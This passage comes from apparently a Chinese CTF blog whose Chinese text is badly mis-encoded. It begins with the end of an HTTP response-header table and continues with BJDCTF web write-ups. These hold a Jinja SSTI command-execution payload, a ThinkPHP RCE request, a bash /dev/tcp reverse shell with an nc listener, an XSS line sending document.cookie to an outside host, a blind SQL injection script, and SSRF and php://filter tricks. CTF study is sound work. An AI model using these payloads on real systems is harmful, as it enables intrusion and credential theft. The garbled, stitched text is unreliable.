¼å¼ä¸ºâ€œP3P:CP=&quot;your_compact_policy&quot;â€ã€‚ç„¶è€ŒP3Pè§„èŒƒå¹¶ä¸æˆåŠŸï¼Œ[33]å¤§éƒ¨åˆ†ç°ä»£æµè§ˆå™¨æ²¡æœ‰å®Œæ•´å®ç°è¯¥åŠŸèƒ½ï¼Œè€Œå¤§é‡ç½‘ç«™ä¹Ÿå°†è¯¥å€¼è®¾ä¸ºå‡å€¼ï¼Œä»è€Œè¶³ä»¥ç”¨æ¥æ¬ºéª—æµè§ˆå™¨çš„P3Pæ’ä»¶åŠŸèƒ½å¹¶æˆæƒç»™ç¬¬ä¸‰æ–¹Cookiesã€‚ P3P: CP=&quot;This is not a P3P policy! ``See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot; å¸¸è®¾ Pragma ä¸å…·ä½“çš„å®ç°ç›¸å…³ï¼Œè¿™äº›å­—æ®µå¯èƒ½åœ¨è¯·æ±‚/å›åº”é“¾ä¸­çš„ä»»ä½•æ—¶å€™äº§ç”Ÿå¤šç§æ•ˆæœã€‚ Pragma: no-cache å¸¸è®¾ Proxy-Authenticate è¦æ±‚åœ¨è®¿é—®ä»£ç†æ—¶æä¾›èº«ä»½è®¤è¯ä¿¡æ¯ã€‚ Proxy-Authenticate: Basic å¸¸è®¾ Public-Key-Pins[34] ç”¨äºç¼“è§£ä¸­é—´äººæ”»å‡»ï¼Œå£°æ˜ç½‘ç«™è®¤è¯ä½¿ç”¨çš„ä¼ è¾“å±‚å®‰å…¨åè®®è¯ä¹¦çš„æ•£åˆ—å€¼ Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;; å¸¸è®¾ Refresh ç”¨äºè®¾å®šå¯å®šæ—¶çš„é‡å®šå‘è·³è½¬ã€‚å³è¾¹ä¾‹å­è®¾å®šäº†5ç§’åè·³è½¬è‡³â€œhttp://www.w3.org/pub/WWW/People.htmlâ€ã€‚ Refresh: 5; url=http://www.w3.org/pub/WWW/People.html ä¸“åˆ©å¹¶éæ ‡å‡†Netscapeå®ç°çš„æ‰©å±•ï¼Œä½†å¤§éƒ¨åˆ†ç½‘é¡µæµè§ˆå™¨ä¹Ÿæ”¯æŒã€‚ Retry-After å¦‚æœæŸä¸ªå®ä½“ä¸´æ—¶ä¸å¯ç”¨ï¼Œåˆ™ï¼Œæ­¤åè®®å¤´ç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯æ—¥åé‡è¯•ã€‚å…¶å€¼å¯ä»¥æ˜¯ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´æ®µ(ä»¥ç§’ä¸ºå•ä½)æˆ–ä¸€ä¸ªè¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸã€‚ [35] Example 1: Retry-After: 120Example 2: Retry-After: Fri, 07 Nov 2014 23:59:59 GMT å¸¸è®¾ Server æœåŠ¡å™¨çš„åå­— Server: Apache/2.4.1 (Unix) å¸¸è®¾ Set-Cookie HTTP cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1 å¸¸è®¾: æ ‡å‡† Status é€šç”¨ç½‘å…³æ¥å£ åè®®å¤´å­—æ®µï¼Œç”¨æ¥è¯´æ˜å½“å‰è¿™ä¸ªè¶…æ–‡æœ¬ä¼ è¾“åè®®å›åº”çš„ çŠ¶æ€ ã€‚æ™®é€šçš„è¶…æ–‡æœ¬ä¼ è¾“åè®®å›åº”ï¼Œä¼šä½¿ç”¨å•ç‹¬çš„â€œçŠ¶æ€è¡Œâ€ï¼ˆâ€Status-Lineâ€ï¼‰ä½œä¸ºæ›¿ä»£ï¼Œè¿™ä¸€ç‚¹æ˜¯åœ¨ RFC 7230 ä¸­å®šä¹‰çš„ã€‚ [36] Status: 200 OK Not listed as a registered field name Strict-Transport-Security HTTP ä¸¥æ ¼ä¼ è¾“å®‰å…¨è¿™ä¸€å¤´éƒ¨å‘ŠçŸ¥å®¢æˆ·ç«¯ç¼“å­˜è¿™ä¸€å¼ºåˆ¶ HTTPS ç­–ç•¥çš„æ—¶é—´ï¼Œä»¥åŠè¿™ä¸€ç­–ç•¥æ˜¯å¦é€‚ç”¨äºå…¶å­åŸŸåã€‚ Strict-Transport-Security: max-age=16070400; includeSubDomains å¸¸è®¾: æ ‡å‡† Trailer è¿™ä¸ªå¤´éƒ¨æ•°å€¼æŒ‡ç¤ºäº†åœ¨è¿™ä¸€ç³»åˆ—å¤´éƒ¨ä¿¡æ¯ç”±ç”±åˆ†å—ä¼ è¾“ç¼–ç ç¼–ç ã€‚ Trailer: Max-Forwards å¸¸è®¾ Transfer-Encoding ç”¨æ¥å°†å®ä½“å®‰å…¨åœ°ä¼ è¾“ç»™ç”¨æˆ·çš„ç¼–ç å½¢å¼ã€‚å½“å‰å®šä¹‰çš„æ–¹æ³•åŒ…æ‹¬ï¼šåˆ†å—ï¼ˆchunkedï¼‰ã€compressã€deflateã€gzipå’Œidentityã€‚ Transfer-Encoding: chunked å¸¸è®¾ Upgrade è¦æ±‚å®¢æˆ·ç«¯å‡çº§åˆ°å¦ä¸€ä¸ªåè®®ã€‚ Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 å¸¸è®¾ Vary å‘ŠçŸ¥ä¸‹æ¸¸çš„ä»£ç†æœåŠ¡å™¨ï¼Œåº”å½“å¦‚ä½•å¯¹æœªæ¥çš„è¯·æ±‚åè®®å¤´è¿›è¡ŒåŒ¹é…ï¼Œä»¥å†³å®šæ˜¯å¦å¯ä½¿ç”¨å·²ç¼“å­˜çš„å›åº”å†…å®¹è€Œä¸æ˜¯é‡æ–°ä»åŸå§‹æœåŠ¡å™¨è¯·æ±‚æ–°çš„å†…å®¹ã€‚ Vary: * å¸¸è®¾ Via å‘ŠçŸ¥ä»£ç†æœåŠ¡å™¨çš„å®¢æˆ·ç«¯ï¼Œå½“å‰å›åº”æ˜¯é€šè¿‡ä»€ä¹ˆé€”å¾„å‘é€çš„ã€‚ Via: 1.0 fred, 1.1 example.com (Apache/1.1) å¸¸è®¾ Warning ä¸€èˆ¬æ€§çš„è­¦å‘Šï¼Œå‘ŠçŸ¥åœ¨å®ä½“å†…å®¹ä½“ä¸­å¯èƒ½å­˜åœ¨é”™è¯¯ã€‚ Warning: 199 Miscellaneous warning å¸¸è®¾ WWW-Authenticate è¡¨æ˜åœ¨è¯·æ±‚è·å–è¿™ä¸ªå®ä½“æ—¶åº”å½“ä½¿ç”¨çš„è®¤è¯æ¨¡å¼ã€‚ WWW-Authenticate: Basic å¸¸è®¾ X-Frame-Options[37] ç‚¹å‡»åŠ«æŒä¿æŠ¤ï¼šdenyï¼šè¯¥é¡µé¢ä¸å…è®¸åœ¨ frame ä¸­å±•ç¤ºï¼Œå³ä½¿æ˜¯åŒåŸŸåå†…ã€‚sameoriginï¼šè¯¥é¡µé¢å…è®¸åŒåŸŸåå†…åœ¨ frame ä¸­å±•ç¤ºã€‚allow-from *uri*ï¼šè¯¥é¡µé¢å…è®¸åœ¨æŒ‡å®šuriçš„ frame ä¸­å±•ç¤ºã€‚allowallï¼šå…è®¸ä»»æ„ä½ç½®çš„frameæ˜¾ç¤ºï¼Œéæ ‡å‡†å€¼ã€‚ X-Frame-Options: deny è¿‡æ—¶çš„[38] å¸¸è§çš„éæ ‡å‡†å›åº”å­—æ®µ å­—æ®µå è¯´æ˜ ç¤ºä¾‹ X-XSS-Protection[39] è·¨ç«™è„šæœ¬æ”»å‡» ï¼ˆXSSï¼‰è¿‡æ»¤å™¨ X-XSS-Protection: 1; mode=block Content-Security-Policy, X-Content-Security-Policy, X-WebKit-CSP[40] å†…å®¹å®‰å…¨ç­–ç•¥å®šä¹‰ã€‚ X-WebKit-CSP: default-src &#39;self&#39; X-Content-Type-Options[41] å”¯ä¸€å…è®¸çš„æ•°å€¼ä¸ºâ€nosniffâ€ï¼Œé˜²æ­¢ Internet Explorer å¯¹æ–‡ä»¶è¿›è¡ŒMIMEç±»å‹å—…æ¢ã€‚è¿™ä¹Ÿå¯¹ Google Chrome ä¸‹è½½æ‰©å±•æ—¶é€‚ç”¨ã€‚[42] X-Content-Type-Options: nosniff X-Powered-By[43] è¡¨æ˜ç”¨äºæ”¯æŒå½“å‰ç½‘é¡µåº”ç”¨ç¨‹åºçš„æŠ€æœ¯ï¼ˆä¾‹å¦‚ï¼šPHPï¼‰ï¼ˆç‰ˆæœ¬å·ç»†èŠ‚é€šå¸¸æ”¾ç½®åœ¨ X-Runtime æˆ– X-Version ä¸­ï¼‰ X-Powered-By: PHP/5.4.0 X-UA-Compatible[44] æ¨èæŒ‡å®šçš„æ¸²æŸ“å¼•æ“ï¼ˆé€šå¸¸æ˜¯å‘åå…¼å®¹æ¨¡å¼ï¼‰æ¥æ˜¾ç¤ºå†…å®¹ã€‚ä¹Ÿç”¨äºæ¿€æ´» Internet Explorer ä¸­çš„ Chrome Frameã€‚ X-UA-Compatible: IE=EmulateIE7 X-UA-Compatible: IE=edge X-UA-Compatible: Chrome=1 X-Content-Duration[45] æŒ‡å‡ºéŸ³è§†é¢‘çš„é•¿åº¦ï¼Œå•ä½ä¸ºç§’ã€‚åªå—Geckoå†…æ ¸æµè§ˆå™¨æ”¯æŒã€‚ X-Content-Duration: 42.666 fake googleæŸ¥çœ‹æºç å‘ç°qaq,è®¿é—®æç¤ºssti ç›´æ¥ç”¨vulhubä¸Šçš„payload: 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; å°±èƒ½å¾—åˆ°flag old-hackæç¤ºthinkphp5ï¼Œ5.0.23 RCEçš„payloadå¯ä»¥è¯»flag 1234http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;captcha#å‘½ä»¤æ‰§è¡ŒPOSTï¼š_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag duangShellæ‰“å¼€æç¤ºswp,è®¿é—®.index.php.swpï¼Œä¸‹è½½ä¸‹æ¥ vi -ræ¢å¤å¾—åˆ° 12345678910111213141516&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123; die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);&#125; else &#123; $girl = $_POST[&#x27;girl_friend&#x27;]; if (preg_match(&#x27;/\\&gt;|\\\\\\/&#x27;, $girl)) &#123; die(&#x27;just girl&#x27;); &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i&#x27;, $girl)) &#123; echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;; &#125; else &#123; //duangShell~~~~ exec($girl); &#125;&#125; å¯ä»¥çœ‹åˆ°æ²¡è¿‡æ»¤ç®¡é“å’Œç©ºæ ¼ ç”±äºbuué¶æœºä¸èƒ½è®¿é—®å†…ç½‘ï¼Œæ–°å»ºä¸€ä¸ªå°å·å»basicé‡Œæ‰¾åˆ°linux-labs æ–°å»ºä¸€ä¸ªindex.php,å†™å…¥ 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.55.214&#x2F;2333 0&gt;&amp;1 ç„¶åèµ·ä¸€ä¸ªwebæœåŠ¡ 1php -S 0.0.0.0:8000 ncç›‘å¬ 1nc -lvp 2333 xssä¹‹å…‰æ‰«ç›®å½•å‘ç°.gitæºç æ³„éœ²ï¼Œæ¢å¤æºç  123&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];$b = unserialize($a); é¢˜ç›®è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹æ˜¯phpåŸç”Ÿç±»ååºåˆ—åŒ– 123&lt;?php$a =new Exception(&quot;&lt;script&gt;window.open(&#x27;http://vps/?a=&#x27;+document.cookie)&lt;/script&gt;&quot;);echo urlencode(serialize($a)); ç®€å•æ³¨å…¥fuzzä¸€æ³¢å‘ç°è¿‡æ»¤äº†å¥½å¤šä¸œè¥¿ union select å•åŒå¼•å· =å·éƒ½è¿‡æ»¤äº† æ‰«è·¯å¾„æ‰«åˆ°robots.txtlé‡Œé¢hint.txté‡Œæœ‰ 1select * from users where username=&#x27;$_POST[&quot;username&quot;]&#x27; and password=&#x27;$_POST[&quot;password&quot;]&#x27; æˆ‘ä»¬å°±å¯ä»¥åŠ ä¸ªè½¬ä¹‰ç¬¦å· 1select * from users where username&#x3D;&#39;admin\\&#39; and password&#x3D;&#39;$password&#39; æ­¤æ—¶usernameçš„å€¼å°±è¢«è®¤ä¸ºæ˜¯admin\\&#39; and password= $passwordä¼  or sleep(3)%23å‘ç°èƒ½å¤Ÿå»¶æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨sleep(3)ä¼ å…¥æ³¨å…¥è¯­å¥ payload: 1or if((ascii(substr((&#123;1&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)# ç”±äºè¡¨ä¸­åªæœ‰ä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨1ä½ç½®ç›´æ¥ä¼ å­—æ®µçš„åå­—å°±èƒ½è·‘å‡ºæ•°æ®äº† ç®€å•åšä¸ªå®éªŒ 12345create database test;use test;create table test (id int(10),username varchar(50),password varchar(50));insert into test (id,username,password) values (&#x27;1&#x27;,&#x27;admin&#x27;,&#x27;admin&#x27;); å‘ç°æ’å…¥å¤šæ¡æ•°æ®ä¹Ÿå¯ä»¥è¿™æ ·ç”¨,ä½†æ˜¯æœ‰ç›¸ä¼¼çš„è¯å°±ä¼šæŸ¥å‡ºå¤šæ¡æ•°æ® å†™äº†ä¸ªexpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsurl=&#x27;http://b4b1391f-dea5-4d42-8e61-f68b27487be2.node3.buuoj.cn&#x27;proxies=&#123; &#x27;http&#x27;:&quot;http://127.0.0.1:8080&quot;&#125;def sqlin(sql): database=&#x27;&#x27; for i in range(1,50): f1=database top=127 low=33 while low&lt;=top: mid=(top+low)//2 data1=&#123; &#x27;username&#x27;:&#x27;admin\\\\&#x27;, &#x27;password&#x27;:&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) &gt; &#123;&#125;),1,0)#&#x27;.format(sql,str(i),str(mid)) &#125; data2=&#123; &#x27;username&#x27;:&#x27;admin\\\\&#x27;, &#x27;password&#x27;:&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#&#x27;.format(sql,str(i),str(mid)) &#125; try: r1=requests.post(url,data=data2) print(i,mid) if &#x27;BJD needs to be stronger&#x27; in r1.text: database+=chr(mid) print(database) break r=requests.post(url,data=data1) if &quot;BJD needs to be stronger&quot; in r.text: low=mid+1 if &#x27;P3rh4ps&#x27; in r.text: top=mid-1 except Exception as e: pass if database==f1: print(database) break# database=&#x27;p3rh4ps&#x27;sql0=&#x27;database()&#x27;sql1=&#x27;username&#x27;sqlin(sql1) æ–‡ä»¶æ¢æµ‹æŠ“åŒ…ï¼Œçœ‹åˆ°httpå¤´é‡Œæœ‰hint:home.php è®¿é—®ä¼šè·³è½¬åˆ° 1home.php?file=system php://filterè¯»æºç ï¼Œsystem.php 1234567891011121314151617181920212223242526272829303132333435363738394041home.php?file=php://filter/read=convert.base64-encode/resource=system&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#x27;y1ng&#x27;]) || $_COOKIE[&#x27;y1ng&#x27;] !== sha1(md5(&#x27;y1ng&#x27;)))&#123; echo &quot;&lt;script&gt;alert(&#x27;why you are here!&#x27;);alert(&#x27;fxck your scanner&#x27;);alert(&#x27;fxck you! get out!&#x27;);&lt;/script&gt;&quot;; header(&quot;Refresh:0.1;url=index.php&quot;); die;&#125;$str2 = &#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#x27;;$str3 = &#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#x27;;$str4 = &#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#x27;;?&gt; &lt;?php$filter1 = &#x27;/^http:\\/\\/127\\.0\\.0\\.1\\//i&#x27;;$filter2 = &#x27;/.?f.?l.?a.?g.?/i&#x27;;if (isset($_POST[&#x27;q1&#x27;]) &amp;&amp; isset($_POST[&#x27;q2&#x27;]) &amp;&amp; isset($_POST[&#x27;q3&#x27;]) ) &#123; $url = $_POST[&#x27;q2&#x27;].&quot;.y1ng.txt&quot;; $method = $_POST[&#x27;q3&#x27;]; $str1 = &quot;~$ python fuck.py -u \\&quot;&quot;.$url .&quot;\\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match(&#x27;/^GET/i&#x27;, $method) &amp;&amp; !preg_match(&#x27;/^POST/i&#x27;, $method)) &#123; die($str4); &#125; $detect = @file_get_contents($url, false); print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#125;?&gt; home.php: 1234567891011121314151617181920212223242526272829303132333435&lt;?phpsetcookie(&quot;y1ng&quot;, sha1(md5(&#x27;y1ng&#x27;)), time() + 3600);setcookie(&#x27;your_ip_address&#x27;, md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]), time()+3600);if(isset($_GET[&#x27;file&#x27;]))&#123; if (preg_match(&quot;/\\^|\\~|&amp;|\\|/&quot;, $_GET[&#x27;file&#x27;])) &#123; die(&quot;forbidden&quot;); &#125; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;not now!&quot;); &#125; if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;You! are! not! my! admin!&quot;); &#125; if(preg_match(&quot;/^home$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;ç¦æ­¢å¥—å¨ƒ&quot;); &#125; else&#123; if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;; &#125; else&#123; $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;; &#125; echo &quot;ç°åœ¨è®¿é—®çš„æ˜¯ &quot;.$file . &quot;&lt;br&gt;&quot;; require $file; &#125;&#125; else &#123; echo &quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;;&#125; è¿™é‡Œæœ‰ä¸ªadmin.phpï¼Œè¯•ç€è®¿é—®ä¸€ä¸‹ å¥½åƒæ²¡å•¥æ€è·¯äº†ï¼Œå†çœ‹ä¸‹system.php 12$detect = @file_get_contents($url, false);print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect)); å’Œæå®¢å¤§æŒ‘æˆ˜çš„æŸé¢˜å¾ˆç±»ä¼¼ï¼Œæˆ‘ä»¬åªéœ€åœ¨$methodä¼ %s%å°†%dè½¬ä¹‰å°±è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€  å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»ssrfè¯»å–åˆ°admin.phpäº†ï¼Œæºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phperror_reporting(0);session_start();$f1ag = &#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;; //fakefunction aesEn($data, $key)&#123; $method = &#x27;AES-128-CBC&#x27;; $iv = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123; if (isset($_COOKIE[&#x27;your_ip_address&#x27;]) &amp;&amp; $_COOKIE[&#x27;your_ip_address&#x27;] === md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_COOKIE[&#x27;y1ng&#x27;] === sha1(md5(&#x27;y1ng&#x27;))) return true; else return false;&#125;if ( $_SERVER[&#x27;REMOTE_ADDR&#x27;] == &quot;127.0.0.1&quot; ) &#123; highlight_file(__FILE__);&#125; else &#123; echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;];&#125;$_SESSION[&#x27;user&#x27;] = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (isset($_GET[&#x27;decrypt&#x27;])) &#123; $decr = $_GET[&#x27;decrypt&#x27;]; if (Check())&#123; $data = $_SESSION[&#x27;secret&#x27;]; include &#x27;flag_2sln2ndln2klnlksnf.php&#x27;; $cipher = aesEn($data, &#x27;y1ng&#x27;); if ($decr === $cipher)&#123; echo WHAT_YOU_WANT; &#125; else &#123; die(&#x27;çˆ¬&#x27;); &#125; &#125; else&#123; header(&quot;Refresh:0.1;url=index.php&quot;); &#125;&#125; else &#123; //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION[&#x27;secret&#x27;] = bin2hex(random_bytes($length));&#125;?&gt; çœ‹äº†çœ‹åé¢çš„éšæœºæ•°ç”Ÿæˆçš„ä»£ç ï¼Œå‘ç°åº”è¯¥æ²¡æœ‰æ–¹æ³•æš´åŠ›ç ´è§£å‡ºæ¥ ä»”ç»†çœ‹çœ‹ï¼Œå‘ç°å¦‚æœç¬¬ä¸€æ¬¡æˆ‘ä»¬è®¾ç½®äº†decryptï¼Œ$_SESSION[&#39;secret&#39;]å°±ä¸ºç©ºï¼Œå³$dataä¸ºç©º è€ŒCheak()å‡½æ•°æ˜¯å¾ˆå¥½ç»•è¿‡çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ : 12345678910&lt;?phperror_reporting(0);function aesEn($data, $key)&#123; $method = &#x27;AES-128-CBC&#x27;; $iv = md5(&#x27;174.0.222.75&#x27;,true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;$cipher = aesEn($data, &#x27;y1ng&#x27;);echo $cipher; elementmasteré¢˜ç›®æœ‰è¿™ä¸¤è¡Œä»£ç  12&lt;p hidden id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;&lt;p hidden id&#x3D;&quot;706870&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;p&gt; 506F2E706870åå…­è¿›åˆ¶è½¬å­—ç¬¦å¾—åˆ°Po.phpï¼Œæˆ‘å“­äº†ã€‚ã€‚ã€‚ Poæ˜¯ä¸€ä¸ªåŒ–å­¦å…ƒç´ ï¼Œåˆšå¥½å’Œé¢˜ç›®çš„å›¾ç›¸å…³ï¼Œç”¨åŒ–å­¦å…ƒç´ è·‘ 12345678import requestss=&#x27;H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue&#x27;for i in s.split(&#x27;, &#x27;): r=requests.get(&#x27;http://04302ff8-21bd-4bbb-86b9-401e9978d758.node3.buuoj.cn/&#123;&#125;.php&#x27;.format(i)) # print(i) if r.status_code==200: print(r.text,end=&#x27;&#x27;) è·‘å®Œå¾—åˆ°And_th3_3LemEnt5_w1LL_De5tR0y_y0u.phpï¼Œè®¿é—®å¾—åˆ°flag SchroÌˆdingeræŠ“åŒ…ï¼Œå‘ç°postè¯·æ±‚å¾—æ—¶ä¾¯ä¸€ç›´æœ‰set_cookieï¼Œå¹¶ä¸”å‰å‡ ä½ä¸å˜ base64è§£å¯†å¾—åˆ°çº¯æ•°å­—ï¼Œåˆšå¥½æ˜¯Unixæ—¶é—´æˆ³ï¼Œä¸æ‡‚ï¼Œè¿™æ ·æ„é€ flagå°±åœ¨é‚£ä¸ªè§†é¢‘è¯„è®ºé‡Œ å‚è€ƒï¼š https://blog.csdn.net/IOT2017/article/details/84069882 https://segmentfault.com/a/1190000015886194?utm_source=tag-newest","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"BJDCTF","slug":"BJDCTF","permalink":"http://www.m00nback.xyz/tags/BJDCTF/"}]},{"title":"CTFtimeåšé¢˜è®°å½•","slug":"ctf-timeåšé¢˜è®°å½•","date":"2020-03-18T15:24:06.000Z","updated":"2020-04-28T07:30:46.725Z","comments":true,"path":"2020/03/18/ctf-timeåšé¢˜è®°å½•/","link":"","permalink":"http://www.m00nback.xyz/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†è‡ªå·±é—²æ¥æ— äº‹åœ¨ctf-timeåšé¢˜çš„è®°å½•ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†è‡ªå·±é—²æ¥æ— äº‹åœ¨ctf-timeåšé¢˜çš„è®°å½•ï¼ Confidence CTFwebCat Webé¢˜ç›®åœ°å€ï¼šhttp://catweb.zajebistyc.tf/ æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¯ä»¥æ‰¾åˆ°flagçš„ä½ç½® æºä»£ç å‘ç°æœ‰reportåŠŸèƒ½ï¼Œå°è¯•ç»™ä¸ªurlå‘ç°ä¼šè®¿é—® Firefox/67.0è¿™ä¸ªä¿¡æ¯ç»™å¾ˆé‡è¦ï¼Œè¿™é¢˜è€ƒå¯Ÿçš„å°±æ˜¯FireFoxçš„ä¸€ä¸ªcve CVE-2019-11730ï¼ŒPOCåœ°å€ï¼šhttps://github.com/alidnf/CVE-2019-11730 åˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå…ˆçœ‹ä¸‹æºç  12345678910111213141516171819202122232425262728293031&lt;script&gt; function getNewCats(kind) &#123; $.getJSON(&#x27;http://catweb.zajebistyc.tf/cats?kind=&#x27;+kind, function(data) &#123; if(data.status != &#x27;ok&#x27;) &#123; return; &#125; $(&#x27;#cats_container&#x27;).empty(); cats = data.content; cats.forEach(function(cat) &#123; var newDiv = document.createElement(&#x27;div&#x27;); newDiv.innerHTML = &#x27;&lt;img style=&quot;max-width: 200px; max-height: 200px&quot; src=&quot;static/&#x27;+kind+&#x27;/&#x27;+cat+&#x27;&quot; /&gt;&#x27;; $(&#x27;#cats_container&#x27;).append(newDiv); &#125;); &#125;); &#125; $(document).ready(function() &#123; $(&#x27;#cat_select&#x27;).change(function() &#123; var kind = $(this).val(); history.pushState(&#123;&#125;, &#x27;&#x27;, &#x27;?&#x27;+kind) getNewCats(kind); &#125;); var kind = window.location.search.substring(1); if(kind == &quot;&quot;) &#123; kind = &#x27;black&#x27;; &#125; getNewCats(kind); &#125;);&lt;/script&gt; å½“æˆ‘ä»¬åˆ‡æ¢çŒ«çš„é¢œè‰²çš„æ—¶å€™å°±ä¼šåƒæœåŠ¡ç«¯å‘é€è¯·æ±‚è·å¾—å›¾ç‰‡çš„åç§° å¦‚æœæˆ‘ä»¬æœç´¢ç°çŒ«ï¼Œåˆ™å›¾åƒçš„è·¯å¾„ä¸ºstatic/grey/1.jpgï¼Œå› æ­¤kindï¼ˆgreyï¼‰æ˜¯æ–‡ä»¶å¤¹ï¼Œæ‰€æœ‰æˆ‘ä»¬å‰é¢çš„ç›®å½•éå†æ‰æˆç«‹ 